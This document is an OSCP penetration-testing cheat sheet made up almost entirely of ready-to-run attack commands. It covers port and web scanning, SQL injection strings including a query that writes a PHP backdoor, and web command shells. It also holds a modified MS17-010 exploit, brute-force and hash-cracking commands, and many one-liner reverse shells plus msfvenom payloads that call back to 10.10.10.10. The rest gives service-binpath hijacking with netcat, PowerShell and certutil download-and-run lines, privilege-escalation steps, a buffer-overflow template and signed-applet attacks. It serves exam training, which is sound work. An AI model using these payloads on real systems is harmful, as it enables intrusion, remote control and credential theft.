
# [OSCP Reference]
## Port Scanning

```bash
#SYN Scan with default Script Scan, Skip host discovery with the fastest timing:
nmap -sC -sS -Pn -T5 -p T:1-65535,U:1-65535 192.168.0.17 > scan 

#Fastest Scan for ever: 
nmap -sS -Pn -T5 192.168.0.17 > scan

#Ping Scan: 
nmap -v -sn 10.0.0.0/8

#Some other pretty useful
nmap -sC -sV -p- -oA nmap/all 10.10.10.10 
nmap -sU -vv -oA nmap/alludp 10.10.10.10
unicornscan 10.1.1.0/24:80
masscan -p22,80,445 10.1.1.0/24
```

## Port Knocking

```bash
for x in 7000 8000 9000; do nmap -Pn --max-retries 0 -p $x 10.10.10.10; done
```

## Web

```bash
# Gobuster 3
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10 -x html,php,txt,xml -t 20
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.10 -x html,php,txt,xml -k

curl -v http://10.10.10.10/robots.txt
curl -k -v https://10.10.10.10/robots.txt
curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://10.10.10.10/robots.txt

curl -v -X OPTIONS http://10.10.10.10/test
davtest -url http://10.10.10.10/test

nikto -h http://10.10.10.10
uniscan -u http://10.10.10.10 -qweds

# TLS
nmap -sV -p 443 --script=ssl-heartbleed 10.10.10.10
sslyze --regular 10.10.10.10
sslscan https://10.10.10.10

# Shellshock
nmap -sV -p- --script http-shellshock 10.10.10.10
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 10.10.10.10

# WordPress
wpscan --url http://10.10.10.10 --enumerate u
wpscan --url http://10.1.1.146 --http-auth admin:Str0ngPass -e

# Drupal
# https://github.com/droope/droopescan
droopescan scan drupal -u http://10.10.10.10

# Joomla
# https://github.com/rezasp/joomscan
joomscan --url http://10.10.10.10

# sqlmap crawl  
sqlmap -u http://10.10.10.10 --crawl=1

# sqlmap dump database  
sqlmap -u http://10.10.10.10 --dbms=mysql --dump

# sqlmap shell  
sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell

# Upload php command injection file
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'

# Load file
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6

# Bypass
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -

# PHP command injection from GET Request
<?php echo system($_GET["cmd"]);?>

# Alternative
<?php echo shell_exec($_GET["cmd"]);?>
```

## SMB

```bash
nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10

nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10

smbmap -u jsmith -p password1 -d workgroup -H 10.10.10.10

enum4linux -av 10.10.10.10

rpcclient -U "" 10.10.10.10

smbclient //10.10.10.10/share
apt-get install -y cifs-utils
mount -t cifs 10.10.10.10:/share1 /test

# Manual MS17-010 exploitation
# https://github.com/worawit/MS17-010
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.10 lport=1337 -f exe > blue.exe

# Before
#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')

# After
smb_send_file(smbConn, 'blue.exe', 'C', '/blue.exe')
service_exec(conn, r'cmd /c c:\\blue.exe')

# smbver.sh
#!/bin/sh
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 10 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1

nmap --script=samba-vuln-cve-2012-1182  -p 139 10.10.10.10
```

## SNMP

```bash
snmp-check 10.10.10.10

onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings_onesixtyone.txt 10.10.10.10 public

snmpwalk -v1 -c public 10.10.10.10
```

## NFS

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.10

mount -t nfs 10.10.10.10:/var/nfs /mnt/nfs

# Resources 
# https://github.com/bonsaiviking/NfSpy
```

## SSH Tunneling

```bash
# https://github.com/sshuttle/sshuttle
sshuttle -vvr user@10.10.10.10 10.1.1.0/24

# Local port forwarding
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>

# Remote port forwarding
ssh <gateway> -R <remote port to bind>:<local host>:<local port>

# Dynamic port forwarding
ssh -D <local proxy port> -p <remote port> <target>

# Plink local port forwarding
plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
```

## Brute Force

```bash
# /etc/shadow
unshadow passwd shadow > unshadow.db
john unshadow.db --wordlist=/usr/share/wordlists/rockyou.txt

# SAM
samdump2 SYSTEM SAM > winhashes.txt
john --format=LM --wordlist=/usr/share/wordlists/rockyou.txt winhashes.txt

# Hashcat SHA512 $6$ shadow file  
hashcat -m 1800 -a 0 hash.txt rockyou.txt --username

# Hashcat MD5 $1$ shadow file  
hashcat -m 500 -a 0 hash.txt rockyou.txt --username

# Hashcat MD5 Apache webdav file  
hashcat -m 1600 -a 0 hash.txt rockyou.txt

# Hashcat SHA1  
hashcat -m 100 -a 0 hash.txt rockyou.txt --force

# Hashcat WordPress  
hashcat -m 400 -a 0 --remove hash.txt rockyou.txt

hydra -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/portal/xlogin/:user=^USER^&pass=^PASS^:invalid login"

hydra -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 https-post-form "/portal/xlogin/:user=^USER^&pass=^PASS^:S=302"

# SSH
hydra -l username -P /usr/share/wordlists/fasttrack.txt ssh://10.10.10.10
# FTP
hydra -l username -P /usr/share/wordlists/fasttrack.txt ftp://10.10.10.10
# RDP
hydra -l username -P /usr/share/wordlists/fasttrack.txt rdp://10.10.10.10
```

## Payload/Shell

```bash
# Bash
bash -i >& /dev/tcp/10.10.10.10/8080 0>&1

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh 10.10.10.10 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

# Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# PHP reverse shell  
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php

# Java WAR reverse shell  
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war

# Linux bind shell  
msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai

# Linux FreeBSD reverse shell  
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf

# Linux C reverse shell  
msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c

# Windows non staged reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe

# Windows Staged (Meterpreter) reverse shell  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe

# Windows Python reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py

# Windows ASP reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp

# Windows ASPX reverse shell
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx

# Windows JavaScript reverse shell with nops  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18

# Windows Powershell reverse shell  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

# Windows reverse shell excluding bad characters  
msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai

# Windows x64 bit reverse shell  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe

# Windows reverse shell embedded into plink  
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```

## Windows Privilege Escalation

```powershell
# What system are we connected to?
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Get the hostname and username (if available)
hostname
echo %username%

# Get users
net users
net user [username]

# Networking stuff
ipconfig /all

# Printer?
route print

# ARP-arific
arp -A

# Active network connections
netstat -ano

# Firewall fun (Win XP SP2+ only)
netsh firewall show state
netsh firewall show config

# Scheduled tasks
schtasks /query /fo LIST /v

# Running processes to started services
tasklist /SVC
net start

# Driver madness
DRIVERQUERY

# WMIC fun (Win 7/8 -- XP requires admin)
wmic /?

# WMIC: check patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search pathces for given patch
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

# AlwaysInstallElevated fun
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Other commands to run to hopefully get what we need
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Service permissions
sc query
sc qc [service_name]

# Accesschk stuff
# https://github.com/ankh2054/windows-pentest/tree/master/Privelege
# accesschk seems to get stuck on certain machines without /accepteula
accesschk.exe /accepteula 
accesschk.exe /accepteula -ucqv [service_name] 
accesschk.exe /accepteula -uwcqv "Authenticated Users" * 
accesschk.exe /accepteula -ucqv [service_name]

# Find all weak folder permissions per drive.
accesschk.exe /accepteula -uwdqs Users c:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Find all weak file permissions per drive.
accesschk.exe /accepteula -uwqs Users c:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*

# Binary planting
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]

# Search for passwords
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

sc qc upnphost
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.10.10.10 1234 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost

# If it fails because of a missing dependency, run the following:
sc config SSDPSRV start= auto
net start SSDPSRV
net start upnphost

# Or remove the dependency:
sc config upnphost depend= ""

# runas not working and have credentials? 
# runas.ps1
$username = 'user'
$password = 'password'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process nc.exe -e cmd.exe 10.10.10.10 4444

powershell -ExecutionPolicy Bypass -File runas.ps1

powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/nishang.ps1')"

​powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10/shell.exe', 'shell.exe')"

certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe

# Simple aspx shell
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("")
o = cmd.StdOut.Readall()
Response.write(o)
%>

# Resources
# https://www.fuzzysecurity.com/tutorials/16.html
# https://guif.re/windowseop
# https://github.com/FuzzySecurity/PowerShell-Suite
# https://github.com/samratashok/nishang
# https://github.com/411Hall/JAWS
# https://github.com/PowerShellMafia/PowerSploit
# https://github.com/rasta-mouse/Sherlock
# https://github.com/ohpe/juicy-potato
```

## Linux Privilege Escalation

```bash
# Enter while in reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl-Z
# In Kali
stty raw -echo && fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color

# Search for SUID
find / -perm -u=s -type f 2>/dev/null

# $PATH manipulation for SUID
cd /tmp
echo "/bin/sh" > ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH

# Writable /etc/passwd
openssl passwd -1 -salt user pass123
su - user
id

# Resources
# https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
# https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
# https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
# https://guif.re/linuxeop
# https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/
# https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
# https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/
# https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
# https://gtfobins.github.io/
```

## Buffer Overflow

```bash
# Payload
payload = "\x41" * <length> + <ret_address> + "\x90" * 16 + <shellcode> + "\x43" * <remaining_length>

# Pattern create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

# Pattern offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <address>

# nasm
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp eax

# Bad characters
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
```

## Client Side Attack

```bash
/usr/lib/jvm/java-8-openjdk-i386/bin/javac -source 1.7 -target 1.7 Java.java

echo "Permissions: all-permissions" > /root/manifest.txt

/usr/lib/jvm/java-8-openjdk-i386/bin/jar cvf Java.jar Java.class

/usr/lib/jvm/java-8-openjdk-i386/bin/keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123

/usr/lib/jvm/java-8-openjdk-i386/bin/jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet

cp Java.class SignedJava.jar /var/www/html/
```
